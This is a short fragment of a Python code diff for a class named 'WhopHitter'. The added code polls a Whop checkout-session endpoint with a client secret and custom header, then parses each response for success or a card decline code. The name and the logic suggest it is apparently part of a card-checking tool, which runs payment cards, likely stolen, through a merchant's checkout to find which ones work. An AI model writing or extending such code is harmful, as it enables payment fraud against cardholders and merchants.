+                        await asyncio.sleep(2.5)
+                        r_poll = await sess.get(
+                            f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}",
+                            params={"client_secret": client_secret_full},
+                            headers={**whop_headers, "X-Ssk": ssk},
+                            timeout=20
+                        )
+                        poll_text = r_poll.text if hasattr(r_poll, 'text') else str(r_poll.content)
+                        parsed = self._parse_response(poll_text, r_poll.status_code, result)
+                        if parsed.get('success') or parsed.get('decline_code'):
+                            break
+
                 result['response_time'] = round(time.time() - t0, 2)
-                result['decline_code'] = 'card_declined'
-                result['error'] = 'Your card was declined.'
                 return result
 
         except Exception as ex:
@@ -494,3 +539,4 @@ class WhopHitter:
             result['decline_code'] = 'exception'
             result['error'] = str(ex)[:150]
             return result
+
